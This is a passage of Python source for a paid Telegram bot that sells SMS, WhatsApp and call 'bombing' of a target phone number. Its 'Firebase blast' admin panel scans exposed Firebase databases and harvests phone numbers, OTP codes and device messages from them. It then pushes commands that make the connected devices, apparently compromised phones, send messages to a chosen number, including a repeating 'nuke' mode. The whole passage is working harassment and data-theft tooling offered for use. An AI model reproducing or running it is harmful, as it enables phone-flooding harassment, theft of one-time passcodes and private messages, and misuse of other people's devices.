            if isinstance(v, str):
                stripped = v.strip()
                if stripped.isdigit() and 10 <= len(stripped) <= 13:
                    phones.setdefault(stripped, newpath)
                if any(t in k_lower for t in ("otp", "code", "verify",
                                              "pin", "token")):
                    if len(stripped) <= 12:
                        otps.append((newpath, stripped))
                if any(t in k_lower for t in ("msg", "message", "sms",
                                              "body", "text")):
                    if 1 <= len(stripped) <= 300:
                        otps.append((newpath, stripped))
            elif isinstance(v, (int, float)):
                if any(t in k_lower for t in ("otp", "code")):
                    otps.append((newpath, str(v)))
            else:
                sp, so = _walk_fb_phones_otps(v, newpath)
                for p, pth in sp.items():
                    phones.setdefault(p, pth)
                otps.extend(so)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            sp, so = _walk_fb_phones_otps(v, f"{path}/{i}")
            for p, pth in sp.items():
                phones.setdefault(p, pth)
            otps.extend(so)
    return phones, otps


async def _fb_get_json(session, url, timeout=20):
    try:
        async with session.get(url, timeout=timeout, ssl=False) as r:
            if r.status != 200:
                return None, f"http {r.status}"
            text = await r.text()
            if not text or text == "null":
                return {}, None
            if len(text) > 12 * 1024 * 1024:
                return None, "too large"
            return json.loads(text), None
    except Exception as e:
        return None, str(e)[:100]


async def scan_firebase(fid, url):
    headers = {"User-Agent": USER_AGENT,
               "Accept": "application/json"}
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector,
                                     timeout=timeout,
                                     headers=headers) as session:
        data, err = await _fb_get_json(session, f"{url}/.json")

    now = int(time.time())
    if err:
        _exec("UPDATE firebase_targets SET reachable=0, last_scan=?, "
              "last_error=? WHERE id=?", (now, err[:200], fid))
        return {"ok": False, "error": err}

    tree = _discover_tree(data or {})

    devices_obj = (data or {}).get(tree["devices"]) or {}
    if not isinstance(devices_obj, dict):
        devices_obj = {}

    online = 0
    total = 0
    saved = 0
    for dev_key, dev_val in devices_obj.items():
        total += 1
        is_online = _extract_online(dev_val)
        if is_online:
            online += 1
        number = _extract_number(dev_val)
        info = json.dumps(dev_val, separators=(",", ":"),
                          ensure_ascii=False)[:300]
        try:
            _exec("INSERT OR REPLACE INTO firebase_devices"
                  "(firebase_id,device_key,phone,info,otp,path,last_seen) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (fid, str(dev_key), number, info, "", tree["devices"],
                   now))
            saved += 1
        except Exception:
            pass

    phones, otps = _walk_fb_phones_otps(data or {})
    for (path, otp) in otps[:FIREBASE_OTP_BUDGET]:
        key = "otp_" + re.sub(r"[^A-Za-z0-9]", "_", path)[:60]
        try:
            _exec("INSERT OR REPLACE INTO firebase_devices"
                  "(firebase_id,device_key,phone,info,otp,path,last_seen) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (fid, key, "", "otp-node", otp, path, now))
        except Exception:
            pass

    _exec("UPDATE firebase_targets SET reachable=1, device_count=?, "
          "otp_count=?, online_count=?, total_count=?, "
          "discovered_tree=?, devices_node=?, messages_node=?, "
          "send_node=?, last_scan=?, last_error='' WHERE id=?",
          (saved, len(otps[:FIREBASE_OTP_BUDGET]), online, total,
           json.dumps(tree, separators=(",", ":")),
           tree["devices"], tree["messages"], tree["send"],
           now, fid))

    return {"ok": True, "devices": saved, "online": online,
            "total": total, "tree": tree}


async def push_firebase(fid, url, message, send_node=None):
    payload = {
        "msg": message, "message": message, "body": message,
        "text": message, "title": "System", "from": "system",
        "device": "all", "to": "all",
        "ts": int(time.time()), "timestamp": int(time.time()),
        "time": int(time.time()), "status": "pending",
    }
    body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    headers = {"Content-Type": "application/json",
               "User-Agent": USER_AGENT}

    nodes = []
    if send_node:
        nodes.append(send_node)
    for n in SEND_NODE_HINTS + ["notification", "notifications",
                                "broadcast", "alert"]:
        if n not in nodes:
            nodes.append(n)

    timeout = aiohttp.ClientTimeout(total=6, connect=3)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for node in nodes:
            try:
                async with session.post(f"{url}/{node}.json",
                                        data=body, headers=headers,
                                        ssl=False) as r:
                    await r.read()
                    if 200 <= r.status < 400:
                        _exec("UPDATE firebase_targets SET push_ok=push_ok+1 "
                              "WHERE id=?", (fid,))
                        return True, node
            except Exception:
                continue
    _exec("UPDATE firebase_targets SET push_fail=push_fail+1 WHERE id=?",
          (fid,))
    return False, None


async def send_to_all_online(fid, url, target_number, message,
                              send_node=None, stop_ev=None,
                              progress_cb=None):
    now = int(time.time())
    rows = _exec(
        "SELECT device_key, info FROM firebase_devices WHERE firebase_id=? "
        "AND device_key NOT LIKE 'otp_%'", (fid,), fetch="all")
    if not rows:
        return 0, None, "no devices"

    online_keys = []
    for r in rows:
        try:
            obj = json.loads(r["info"]) if r["info"] else {}
        except Exception:
            obj = {}
        if _extract_online(obj):
            online_keys.append(r["device_key"])

    if not online_keys:
        online_keys = [r["device_key"] for r in rows]

    headers = {"Content-Type": "application/json",
               "User-Agent": USER_AGENT}

    payload_base = {
        "to": target_number, "number": target_number,
        "phone": target_number,
        "message": message, "msg": message,
        "body": message, "text": message,
        "ts": now, "timestamp": now, "status": "pending",
    }

    node = send_node or "sms"

    timeout = aiohttp.ClientTimeout(total=12, connect=4)
    connector = aiohttp.TCPConnector(ssl=False, limit=100,
                                     limit_per_host=30)
    sent = [0]
    last_report = [0.0]
    total = len(online_keys)

    async with aiohttp.ClientSession(timeout=timeout,
                                     connector=connector,
                                     headers=headers) as session:
        async def one(dev_key, idx):
            if stop_ev and stop_ev.is_set():
                return
            payload = dict(payload_base)
            payload["device"] = dev_key
            payload["device_id"] = dev_key
            body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
            for path in (
                f"{url}/{node}/{dev_key}.json",
                f"{url}/{node}.json",
                f"{url}/send/{dev_key}.json",
            ):
                try:
                    async with session.post(path, data=body,
                                            ssl=False) as r:
                        await r.read()
                        if 200 <= r.status < 400:
                            sent[0] += 1
                            break
                except Exception:
                    continue
            if progress_cb:
                n = time.time()
                if n - last_report[0] >= 1.5:
                    last_report[0] = n
                    try:
                        await progress_cb(idx + 1, total, sent[0])
                    except Exception:
                        pass

        tasks = [asyncio.create_task(one(k, i))
                 for i, k in enumerate(online_keys)]
        await asyncio.gather(*tasks, return_exceptions=True)

    return sent[0], node, None


async def nuke_firebase(fid, url, target_number, message,
                        send_node=None, stop_ev=None,
                        concurrent=200, progress_cb=None):
    rounds = [0]
    total_sent = [0]
    while not (stop_ev and stop_ev.is_set()):
        s, node, err = await send_to_all_online(
            fid, url, target_number, message,
            send_node=send_node, stop_ev=stop_ev,
            progress_cb=progress_cb)
        rounds[0] += 1
        total_sent[0] += s
        if err:
            return total_sent[0], rounds[0], err
        await asyncio.sleep(0.5)
    return total_sent[0], rounds[0], None


async def scan_all_firebase(progress_cb=None):
    rows = _exec("SELECT id, url FROM firebase_targets WHERE active=1",
                 fetch="all")
    total = len(rows)
    ok = fail = 0
    for i, r in enumerate(rows):
        try:
            res = await scan_firebase(r["id"], r["url"])
            if res.get("ok"):
                ok += 1
            else:
                fail += 1
        except Exception as e:
            log.warning("scan fail %s: %s", r["url"], e)
            fail += 1
        if progress_cb:
            try:
                await progress_cb(i + 1, total, ok, fail)
            except Exception:
                pass
        await asyncio.sleep(0.05)
    return ok, fail, total


async def get_device_messages(fid, device_key, limit=50):
    t = _exec("SELECT url, messages_node, send_node FROM firebase_targets "
              "WHERE id=?", (fid,), fetch="one")
    if not t:
        return []
    url = t["url"]
    msgs_node = t["messages_node"] or "messages"
    out = []
    headers = {"User-Agent": USER_AGENT}
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    paths = [
        f"{url}/{msgs_node}/{device_key}.json",
        f"{url}/messages/{device_key}.json",
        f"{url}/sms/{device_key}.json",
        f"{url}/inbox/{device_key}.json",
    ]
    async with aiohttp.ClientSession(timeout=timeout,
                                     headers=headers) as session:
        for p in paths:
            try:
                async with session.get(p, ssl=False) as r:
                    if r.status != 200:
                        continue
                    txt = await r.text()
                    if not txt or txt == "null":
                        continue
                    try:
                        data = json.loads(txt)
                    except Exception:
                        continue

                    def flat(o, pref=""):
                        if isinstance(o, dict):
                            for k, v in o.items():
                                flat(v, f"{pref}/{k}" if pref else str(k))
                        elif isinstance(o, list):
                            for i2, v in enumerate(o):
                                flat(v, f"{pref}[{i2}]")
                        else:
                            out.append((pref, str(o)))

                    flat(data)
                    if out:
                        break
            except Exception:
                continue
    return out[:limit]


def fb_test_slot_get(slot):
    return _exec("SELECT * FROM firebase_test_ids WHERE slot=?",
                 (slot,), fetch="one")


def fb_test_slot_set(slot, fid, device_key):
    _exec("INSERT OR REPLACE INTO firebase_test_ids(slot,firebase_id,"
          "device_key,added_at) VALUES(?,?,?,?)",
          (slot, fid, device_key, int(time.time())))


def fb_test_slot_clear(slot):
    _exec("DELETE FROM firebase_test_ids WHERE slot=?", (slot,))


async def fb_test_fire(slot, target_number, message):
    row = fb_test_slot_get(slot)
    if not row:
        return False, "no slot set"
    t = _exec("SELECT * FROM firebase_targets WHERE id=?",
              (row["firebase_id"],), fetch="one")
    if not t:
        return False, "firebase missing"

    node = t["send_node"] or "sms"
    url = t["url"]
    dev = row["device_key"]
    now = int(time.time())
    payload = {
        "device": dev, "device_id": dev,
        "to": target_number, "number": target_number,
        "phone": target_number,
        "message": message, "msg": message,
        "body": message, "text": message,
        "ts": now, "timestamp": now, "status": "pending",
    }
    headers = {"Content-Type": "application/json",
               "User-Agent": USER_AGENT}
    timeout = aiohttp.ClientTimeout(total=8, connect=4)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for path in (
            f"{url}/{node}/{dev}.json",
            f"{url}/{node}.json",
            f"{url}/send/{dev}.json",
        ):
            try:
                async with session.post(path,
                                        data=json.dumps(payload).encode(),
                                        headers=headers, ssl=False) as r:
                    await r.read()
                    if 200 <= r.status < 400:
                        return True, f"posted to {path.split('//', 1)[1]}"
            except Exception:
                continue
    return False, "all paths failed"


# ─────────────────────────────────────────────────────────────
# BOT + DISPATCHER
# ─────────────────────────────────────────────────────────────
bot = Bot(token=BOT_TOKEN,
          default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoRegisterMiddleware())
dp.callback_query.middleware(AutoRegisterMiddleware())

BOMB_STOPS = {}
FB_SEND_STOPS = {}


# ─────────────────────────────────────────────────────────────
# FSM
# ─────────────────────────────────────────────────────────────
class UserFSM(StatesGroup):
    bomb_target      = State()
    redeem_code      = State()
    fb_target_number = State()
    fb_message       = State()
    fb_slot_number   = State()
    fb_slot_message  = State()


class AdminFSM(StatesGroup):
    add_credits_uid   = State()
    add_credits_amt   = State()
    add_coins_uid     = State()
    add_coins_amt     = State()
    grant_lt_uid      = State()
    revoke_lt_uid     = State()
    redeem_amount     = State()
    redeem_uses       = State()
    broadcast         = State()
    find_user         = State()
    edit_setting      = State()
    blacklist_add     = State()
    fb_add_url        = State()
    fb_remove_id      = State()
    fb_view_devices   = State()
    fb_view_messages  = State()
    fb_push_id        = State()
    fb_push_msg       = State()
    fb_slot_set       = State()
    fb_slot_fire_num  = State()
    fb_slot_fire_msg  = State()
    fb_nuke_fid       = State()
    fb_nuke_number    = State()
    fb_nuke_msg       = State()


# ─────────────────────────────────────────────────────────────
# KEYBOARDS
# ─────────────────────────────────────────────────────────────
def main_menu_kb(admin=False, has_lifetime=False):
    rows = [
        [InlineKeyboardButton(text="💣 SMS BOMBER",     callback_data="b:start"),
         InlineKeyboardButton(text="🔥 FIREBASE BLAST", callback_data="f:home")],
        [InlineKeyboardButton(text="💰 Balance", callback_data="m:bal"),
         InlineKeyboardButton(text="🎁 Redeem",  callback_data="m:redeem")],
        [InlineKeyboardButton(text="📜 History", callback_data="m:hist"),
         InlineKeyboardButton(text="🎉 Daily",   callback_data="m:daily")],
        [InlineKeyboardButton(text="📖 Help",    callback_data="m:help"),
         InlineKeyboardButton(text="📞 Contact",
                              url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}")],
    ]
    if not has_lifetime:
        rows.insert(2, [InlineKeyboardButton(
            text=f"⭐ Buy Lifetime ({setting('lifetime_cost')} cr)",
            callback_data="m:lifetime")])
    if admin:
        rows.append([InlineKeyboardButton(text="🛠 Admin Panel",
                                          callback_data="a:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]
    ])


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="m:home")]
    ])


def duration_kb():
    c = setting("cost_per_min", int)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"1 min ({c}c)",   callback_data="b:dur:1"),
         InlineKeyboardButton(text=f"5 min ({5*c}c)", callback_data="b:dur:5"),
         InlineKeyboardButton(text=f"15m ({15*c}c)",  callback_data="b:dur:15")],
        [InlineKeyboardButton(text=f"30m ({30*c}c)",  callback_data="b:dur:30"),
         InlineKeyboardButton(text=f"1h ({60*c}c)",   callback_data="b:dur:60"),
         InlineKeyboardButton(text="♾️ Lifetime",
                              callback_data="b:dur:lt")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",         callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",         callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Credits",       callback_data="a:add"),
         InlineKeyboardButton(text="➖ Remove Credits", callback_data="a:ded")],
        [InlineKeyboardButton(text="🪙 Add Coins",     callback_data="a:add_coins"),
         InlineKeyboardButton(text="⭐ Grant Lifetime",  callback_data="a:lt_grant")],
        [InlineKeyboardButton(text="🚫 Revoke Lifetime", callback_data="a:lt_revoke"),
         InlineKeyboardButton(text="👑 Lifetime List",  callback_data="a:lt_list")],
        [InlineKeyboardButton(text="🎁 Redeem Codes",  callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",          callback_data="a:apis")],
        [InlineKeyboardButton(text="⚙️ Settings",      callback_data="a:settings"),
         InlineKeyboardButton(text="🔥 Firebase Panel", callback_data="a:fb")],
        [InlineKeyboardButton(text="🚫 Blacklist",     callback_data="a:black"),
         InlineKeyboardButton(text="🔎 Find User",     callback_data="a:find")],
        [InlineKeyboardButton(text="📢 Broadcast",     callback_data="a:bcast"),
         InlineKeyboardButton(text="📋 Logs",          callback_data="a:logs:0")],
        [InlineKeyboardButton(text="📤 Export Users",  callback_data="a:export"),
         InlineKeyboardButton(text="🏠 Main Menu",     callback_data="m:home")],
    ])


def admin_back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Back to Admin", callback_data="a:home")]
    ])


def fb_admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Status",         callback_data="a:fb_status"),
         InlineKeyboardButton(text="🔄 Scan All",       callback_data="a:fb_scan")],
        [InlineKeyboardButton(text="📱 View Devices",   callback_data="a:fb_devices"),
         InlineKeyboardButton(text="💬 Device Messages", callback_data="a:fb_msgs")],
        [InlineKeyboardButton(text="📨 Push Broadcast", callback_data="a:fb_push"),
         InlineKeyboardButton(text="💣 Nuke Mode",      callback_data="a:fb_nuke")],
        [InlineKeyboardButton(text="🎯 Test ID 1",      callback_data="a:fb_slot1"),
         InlineKeyboardButton(text="🎯 Test ID 2",      callback_data="a:fb_slot2")],
        [InlineKeyboardButton(text="➕ Add Target",     callback_data="a:fb_add"),
         InlineKeyboardButton(text="🗑 Remove",         callback_data="a:fb_remove")],
        [InlineKeyboardButton(text="⬅️ Back",           callback_data="a:home")],
    ])


def fb_slot_kb(slot):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Fire from this device",
                              callback_data=f"f:slot_fire:{slot}")],
        [InlineKeyboardButton(text="🔄 Change device",
                              callback_data=f"f:slot_set:{slot}"),
         InlineKeyboardButton(text="🗑 Clear slot",
                              callback_data=f"f:slot_clear:{slot}")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="a:fb")],
    ])


def fb_user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Send to a number", callback_data="f:send_start")],
        [InlineKeyboardButton(text="📊 Status",           callback_data="f:status")],
        [InlineKeyboardButton(text="🏠 Menu",             callback_data="m:home")],
    ])


# ─────────────────────────────────────────────────────────────
# COMMANDS
# ─────────────────────────────────────────────────────────────
@dp.message(CommandStart(deep_link=True))
async def cmd_start_ref(m: types.Message, state: FSMContext):
    await state.clear()
    args = m.text.split(maxsplit=1) if m.text else []
    payload = args[1].strip() if len(args) > 1 else ""
    ref = None
    mm = re.match(r"^ref_(\d+)$", payload)
    if mm:
        ref = int(mm.group(1))
    u = ensure_user(m.from_user, referrer=ref)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")
    await _welcome(m, u)


@dp.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")
    await _welcome(m, u)


async def _welcome(m, u):
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"🪙 Coins: <b>{u['coins']}</b>\n"
        f"{'⭐ LIFETIME active' if u['lifetime'] else ''}\n\n"
        f"Pick an option:",
        reply_markup=main_menu_kb(is_admin(m.from_user.id),
                                  bool(u["lifetime"])))


@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(m.from_user.id):
        return
    await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())


@dp.message(Command("stop"))
async def cmd_stop(m: types.Message):
    stopped = False
    ev = BOMB_STOPS.get(m.from_user.id)
    if ev:
        ev.set()
        stopped = True
    ev2 = FB_SEND_STOPS.get(m.from_user.id)
    if ev2:
        ev2.set()
        stopped = True
    if stopped:
        await m.answer("🛑 Stop signal sent.")
    else:
        await m.answer("Nothing running.")


@dp.message(Command("reseed"))
async def cmd_reseed(m: types.Message):
    if not is_admin(m.from_user.id):
        return
    seed_all_endpoints(force_refresh=True)
    seed_firebase(force_refresh=True)
    a = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    f = _exec("SELECT COUNT(*) c FROM firebase_targets", fetch="one")["c"]
    await m.answer(f"✅ Reseeded.\nAPIs: <b>{a}</b>\nFirebase: <b>{f}</b>")


# ─────────────────────────────────────────────────────────────
# MAIN MENU CALLBACKS
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:home")
async def cb_home(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🏠 <b>Main Menu</b>\n\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"🪙 Coins: <b>{u['coins']}</b>\n"
        f"💥 Bombs: <b>{u['total_bombs']}</b>\n"
        f"📨 Sent: <b>{u['total_sent']}</b>\n"
        f"🔥 Firebase pushes: <b>{u['total_pushes']}</b>\n"
        f"{'⭐ LIFETIME active' if u['lifetime'] else ''}",
        reply_markup=main_menu_kb(is_admin(c.from_user.id),
                                  bool(u["lifetime"])))
    await c.answer()


@dp.callback_query(F.data == "m:cancel")
async def cb_cancel(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        "❌ Cancelled.",
        reply_markup=main_menu_kb(is_admin(c.from_user.id),
                                  bool(u["lifetime"])))
    await c.answer()


@dp.callback_query(F.data == "m:bal")
async def cb_bal(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    bot_me = await bot.get_me()
    ref_link = f"https://t.me/{bot_me.username}?start=ref_{u['user_id']}"
    lt = "⭐ ACTIVE" if u["lifetime"] else "❌ Not active"
    await c.message.edit_text(
        f"💰 <b>Your Account</b>\n\n"
        f"🆔 <code>{u['user_id']}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"🪙 Coins: <b>{u['coins']}</b>\n"
        f"⭐ Lifetime: <b>{lt}</b>\n"
        f"💥 Bombs fired: <b>{u['total_bombs']}</b>\n"
        f"📨 Messages sent: <b>{u['total_sent']}</b>\n"
        f"🔥 Firebase pushes: <b>{u['total_pushes']}</b>\n"
        f"🔗 Referrals: <b>{u['ref_count']}</b>\n\n"
        f"<b>Invite link:</b>\n<code>{ref_link}</code>\n"
        f"Earn {setting('referral_bonus')} credits per signup.",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:help")
async def cb_help(c: types.CallbackQuery):
    total_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                       fetch="one")["c"]
    total_fb = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
                     fetch="one")["c"]
    cpm = setting("cost_per_min")
    coin = setting("coin_cost")
    await c.message.edit_text(
        "📖 <b>How to use</b>\n\n"
        "<b>💣 SMS BOMBER</b>\n"
        "1. Tap SMS BOMBER\n"
        "2. Send target phone\n"
        "3. Pick duration\n"
        "4. SMS + WhatsApp + Call + Legacy fire together\n\n"
        f"<i>1 min = {cpm} credit · Lifetime = {setting('lifetime_cost')} credits</i>\n\n"
        "<b>🔥 FIREBASE BLAST</b>\n"
        "1. Tap FIREBASE BLAST\n"
        "2. Pick target number\n"
        "3. Write custom message\n"
        "4. Fires from every online device\n\n"
        f"<i>1 fire = {coin} coin</i>\n\n"
        f"<b>Live endpoints:</b> {total_apis} APIs · {total_fb} Firebase",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:hist")
async def cb_hist(c: types.CallbackQuery):
    rows = _exec(
        "SELECT * FROM bomb_history WHERE user_id=? ORDER BY ts DESC LIMIT 10",
        (c.from_user.id,), fetch="all")
    if not rows:
        txt = "📜 No history yet."
    else:
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            lines.append(
                f"• [{r['category']}] <code>{r['target'][:20]}</code> → "
                f"{r['ok']}✅ {r['fail']}❌ ({t})")
        txt = "📜 <b>Last 10</b>\n\n" + "\n".join(lines)
    await c.message.edit_text(txt, reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:daily")
async def cb_daily(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    now = int(time.time())
    if now - u["last_daily"] < 86400:
        wait = 86400 - (now - u["last_daily"])
        h, rem = divmod(wait, 3600)
        mm = rem // 60
        return await c.answer(f"⏳ Next in {h}h {mm}m", show_alert=True)
    bonus = setting("daily_bonus", int)
    add_credits(c.from_user.id, bonus)
    _exec("UPDATE users SET last_daily=? WHERE user_id=?",
          (now, c.from_user.id))
    u2 = get_user(c.from_user.id)
    await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
    await c.message.edit_text(
        f"🎉 Daily bonus: +{bonus} credits\n"
        f"💳 Balance: <b>{u2['credits']}</b>",
        reply_markup=back_kb())


@dp.callback_query(F.data == "m:lifetime")
async def cb_buy_lifetime(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    if u["lifetime"]:
        return await c.answer("Already active.", show_alert=True)
    cost = setting("lifetime_cost", int)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ Pay {cost} credits",
                              callback_data="m:lt_buy")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]
    ])
    await c.message.edit_text(
        f"⭐ <b>Buy Lifetime Bomber</b>\n\n"
        f"Cost: <b>{cost}</b> credits (one-time)\n\n"
        f"Benefits:\n"
        f"• Free unlimited bombs forever\n"
        f"• No per-minute cost\n"
        f"• Priority worker slots\n\n"
        f"Your balance: <b>{u['credits']}</b> credits",
        reply_markup=kb)
    await c.answer()


@dp.callback_query(F.data == "m:lt_buy")
async def cb_lt_buy(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    if u["lifetime"]:
        return await c.answer("Already active.", show_alert=True)
    cost = setting("lifetime_cost", int)
    if not take_credits(c.from_user.id, cost):
        return await c.answer(f"❌ Need {cost} credits.", show_alert=True)
    _exec("UPDATE users SET lifetime=1 WHERE user_id=?", (c.from_user.id,))
    log_action(c.from_user.id, "buy_lifetime", f"cost={cost}")
    await c.answer("⭐ Lifetime activated!", show_alert=True)
    await c.message.edit_text(
        f"⭐ <b>Lifetime activated!</b>\n\n"
        f"Unlimited free bombing unlocked.\n"
        f"💳 Balance: <b>{get_user(c.from_user.id)['credits']}</b>",
        reply_markup=main_menu_kb(is_admin(c.from_user.id), True))


# ─────────────────────────────────────────────────────────────
# SMS BOMBER FLOW
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "b:start")
async def cb_bomb_start(c: types.CallbackQuery, state: FSMContext):
    u = get_user(c.from_user.id)
    if u["banned"]:
        return await c.answer("You are banned.", show_alert=True)
    if setting("maintenance", int):
        return await c.answer("Maintenance mode.", show_alert=True)
    total_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                       fetch="one")["c"]
    await state.set_state(UserFSM.bomb_target)
    await c.message.edit_text(
        f"💣 <b>SMS BOMBER</b>\n\n"
        f"Send the target phone number.\n\n"
        f"<b>Example:</b> <code>9922458565</code>\n\n"
        f"🔌 {total_apis} endpoints loaded\n"
        f"⚡ SMS + WhatsApp + Voice + Legacy — all at once",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_target, F.text)
async def fsm_bomb_target(m: types.Message, state: FSMContext):
    raw = (m.text or "").strip()
    digits = "".join(ch for ch in raw if ch.isdigit())
    if len(digits) < 10:
        return await m.answer("❌ Invalid number. Digits only.",
                              reply_markup=cancel_kb())
    target = digits[-10:]
    await state.update_data(target=target)
    u = get_user(m.from_user.id)
    cpm = setting("cost_per_min", int)
    await m.answer(
        f"🎯 Target: <code>{target}</code>\n\n"
        f"<b>Pick duration:</b>\n"
        f"<i>1 min = {cpm} credit</i>"
        + ("\n⭐ <b>Lifetime — free</b>" if u["lifetime"] else ""),
        reply_markup=duration_kb())


@dp.callback_query(F.data.startswith("b:dur:"))
async def cb_duration(c: types.CallbackQuery, state: FSMContext):
    part = c.data.split(":")[2]
    data = await state.get_data()
    target = data.get("target")
    if not target:
        await state.clear()
        return await c.answer("Session expired.", show_alert=True)
    u = get_user(c.from_user.id)

    if part == "lt":
        if not u["lifetime"]:
            await state.clear()
            return await c.answer("Lifetime not active.", show_alert=True)
        duration_min = 1440
        cost = 0
    else:
        try:
            duration_min = int(part)
        except ValueError:
            return await c.answer("bad")
        cpm = setting("cost_per_min", int)
        cost = 0 if u["lifetime"] else duration_min * cpm

    if cost > 0 and not take_credits(c.from_user.id, cost):
        await state.clear()
        return await c.answer(f"❌ Need {cost} credits.", show_alert=True)

    await state.clear()
    await _launch_bomber(c.message, c.from_user.id, target,
                         duration_min, cost)
    await c.answer()


async def _launch_bomber(msg, uid, target, duration_min, cost):
    u = get_user(uid)
    now = int(time.time())
    cooldown = setting("cooldown", int)
    if now - u["last_bomb"] < cooldown:
        return await msg.answer(
            f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
    if is_blacklisted(target):
        return await msg.answer(f"🚫 <code>{target}</code> blacklisted")

    _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 "
          "WHERE user_id=?", (now, uid))
    log_action(uid, "bomb_start", f"{target} {duration_min}m cost={cost}")

    stop_ev = asyncio.Event()
    BOMB_STOPS[uid] = stop_ev

    duration_sec = duration_min * 60
    text = (
        f"🚀 <b>BOMBING</b>\n\n"
        f"🎯 <code>{target}</code>\n"
        f"⏱ Duration: <b>{duration_min}</b> min\n"
        f"💳 Cost: <b>{cost}</b> credits\n"
        f"⚡ parallel workers\n\n"
        f"🔥 Firing now..."
    )
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 STOP", callback_data="b:stop")]
    ])
    status = await msg.edit_text(text, reply_markup=stop_kb)

    asyncio.create_task(_run_and_report(status, uid, target,
                                         duration_sec, duration_min,
                                         stop_ev))


@dp.callback_query(F.data == "b:stop")
async def cb_stop_bomb(c: types.CallbackQuery):
    ev = BOMB_STOPS.get(c.from_user.id)
    if ev:
        ev.set()
        await c.answer("🛑 Stopping...", show_alert=False)
    else:
        await c.answer("Nothing to stop.", show_alert=True)


async def _run_and_report(status_msg, uid, target, duration_sec,
                           duration_min, stop_ev):
    async def progress(ok, fail, remaining):
        mm, ss = divmod(max(0, remaining), 60)
        try:
            await status_msg.edit_text(
                f"🚀 <b>BOMBING</b>\n\n"
                f"🎯 <code>{target}</code>\n"
                f"⏳ Remaining: <b>{mm}m {ss}s</b>\n"
                f"📨 Sent: <b>{ok}</b>  ❌ {fail}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛑 STOP",
                                          callback_data="b:stop")]
                ]))
        except Exception:
            pass

    try:
        ok, fail, err = await run_bomber(target, duration_sec, stop_ev,
                                          progress_cb=progress)
        total = ok + fail
        _exec("UPDATE users SET total_sent=total_sent+? WHERE user_id=?",
              (ok, uid))
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
              "category,ts) VALUES(?,?,?,?,?,?,?,?)",
              (uid, target, total, "OTP", ok, fail, "all",
               int(time.time())))
        u = get_user(uid)
        text = (
            f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Done</b>\n\n"
            f"🎯 <code>{target}</code>\n"
